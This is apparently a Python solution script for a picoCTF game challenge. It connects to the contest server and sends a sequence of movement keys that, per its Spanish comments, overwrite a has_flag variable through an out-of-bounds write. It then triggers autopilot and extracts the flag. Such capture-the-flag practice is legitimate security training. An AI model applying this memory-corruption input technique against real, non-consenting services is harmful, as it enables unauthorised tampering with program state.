import socket, time, re

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('saturn.picoctf.net', 59375))
time.sleep(0.5)
s.recv(8192)

print("Solución confirmada: escribir 'Z' en has_flag\n")

# Paso 1: Subir a row=0
print("Paso 1: Subir a row=0 (4 movimientos w)...")
cmd_sequence = b'w\nw\nw\nw\n'
s.send(cmd_sequence)
time.sleep(2)
s.recv(8192)

# Paso 2: Comando 'l' + 'Z'
print("Paso 2: Comando 'l' luego 'Z'...")
s.send(b'l')
time.sleep(0.5)
s.send(b'Z')
time.sleep(0.5)

# Paso 3: Mover izquierda 8 veces
print("Paso 3: Mover izquierda 8 veces...")
cmd_sequence = b'a\na\na\na\na\na\na\na\n'
s.send(cmd_sequence)
time.sleep(4)

data = s.recv(8192).decode(errors='ignore')

print("\nVerificando has_flag...")
if 'Player has flag: 90' in data or 'flag: 90' in data or 'Player has flag: 1' in data:
    print("¡FLAG ACTIVADA! Valor de has_flag detectado")
    
    # Ahora ganar el juego
    print("\nUsando autopilot 'p' para ganar...")
    s.send(b'p\n')
    time.sleep(5)
    
    # Capturar toda la salida
    final_data = b''
    for i in range(30):
        try:
            s.settimeout(0.3)
            chunk = s.recv(8192)
            if chunk:
                final_data += chunk
            else:
                break
        except:
            break
    
    text = final_data.decode(errors='ignore')
    
    # Buscar la flag
    match = re.search(r'picoCTF\{[^}]+\}', text)
    if match:
        print(f"\n{'='*60}")
        print(f"FLAG: {match.group()}")
        print(f"{'='*60}")
    else:
        print("\nNo se encontró picoCTF{} en el output")
        print("Últimas líneas:")
        print(text[-500:])
else:
    # Verificar has_flag de otra manera
    for line in data.split('\n'):
        if 'flag:' in line.lower():
            print(f"  {line}")

s.close()
